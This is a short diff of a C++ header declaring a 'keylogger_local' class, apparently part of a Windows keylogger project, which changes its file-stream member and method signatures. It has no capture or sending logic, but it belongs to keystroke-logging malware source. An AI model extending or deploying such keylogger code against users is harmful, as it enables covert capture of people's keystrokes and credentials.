@@ -3,20 +3,19 @@
 
 #include "../keylogger.hpp"
 
-using namespace std;
-
 class keylogger_local : virtual public keylogger
 {
     private:
-		ofstream a_ofstream;
+		ofstream* a_ofstream;
 
     public:
 		keylogger_local();
+
 		virtual ~keylogger_local();
 
-		virtual void initialize();
+		virtual void initialize(string);
 
-		virtual void save(LPCSTR);
+		virtual void save();
 };
 
 #endif
